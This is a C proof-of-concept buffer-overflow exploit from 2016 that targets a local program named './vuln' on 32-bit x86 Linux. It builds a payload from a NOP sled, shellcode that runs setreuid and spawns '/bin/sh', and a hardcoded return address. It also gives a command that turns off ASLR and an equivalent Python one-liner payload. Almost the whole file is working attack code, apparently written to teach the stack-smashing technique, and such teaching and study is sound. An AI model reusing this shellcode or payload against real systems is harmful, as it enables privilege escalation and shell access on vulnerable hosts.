/*
 * Smash the stack exploit.
 * (C) 2016 nighter 
 * 
 * pOc how to exploit a buffer overflow bug on x86.
 * 
 * Compile with
 *    gcc ./exploit.c -m32 -w -o exploit
 * 
 * Be sure ASLR is turned off.
 *    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
 *
 * If you rather use the oneliner.
 *
 *    ./vuln $(python -c 'print \"\x90\"*89+\"\x31\xc0\x31\xdb\x31\xc9\x31\xd2 \
          \xb0\x46\x66\xbb\xee\x03\x66\xb9\xee\x03\xcd\x80\x31\xc0\x31\xdb \
          \x31\xc9\x31\xd2\xb0\x0b\xeb\x06\x5b\x88\x4b\x07\xcd\x80\xe8 \
          \xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\"+\"\x30\xb2\xff\xff\"')
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFFER          148
#define RETADDR         0xffffb230
#define NOP             0x90

static char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0"
			  "\x46\x66\xbb\xee\x03\x66\xb9\xee\x03"
			  "\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31"
			  "\xd2\xb0\x0b\xeb\x06\x5b\x88\x4b\x07"
			  "\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62"
			  "\x69\x6e\x2f\x73\x68\x4e";

void banner()
{
   printf("      ▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄\n");
   printf("     █░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄\n");
   printf("    █░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█\n");
   printf("   █░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█\n");
   printf(" ▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█\n");
   printf("█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█\n");
   printf("█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n");
   printf(" █░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█\n");
   printf("  █░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█\n");
   printf("   █░░░░██░░▀█▄▄▄█▄▄█▄████░█\n");
   printf("    █░░░░▀▀▄░█░░░█░█▀██████░█\n");
   printf("     ▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█\n");
   printf("       ▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█\n");
   printf("          ▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█\n");
   printf("              ▀▄▄▄▄▄░░░░░░░░█\n");
   printf("\np0c by %s[%s]\n\n","nighter","https://nighter.se");
}

char build_payload(char *payload)
{
        int i;
        long retaddr;
        char *load = (char *) &shellcode;
        retaddr = RETADDR;
        memset(payload, '\0', sizeof(payload));

        /* Add nops */
	for(i = 0; i < 90; i++)
	{
	    *(payload + i) = NOP;
        }

	/* Add shellcode */
	memcpy(payload + i, load, strlen(load));

	/* Add return address */
        for(i = 140; i < BUFFER; i += 4)
                *(long *)&payload[i] = retaddr;

        payload[BUFFER] = 0x00;
        return *payload;
}

int main(int argc, char **argv)
{
    char payload[BUFFER];
    banner();
    build_payload(payload);
    execl("./vuln", "vuln" , payload, NULL);
    return 0;
}
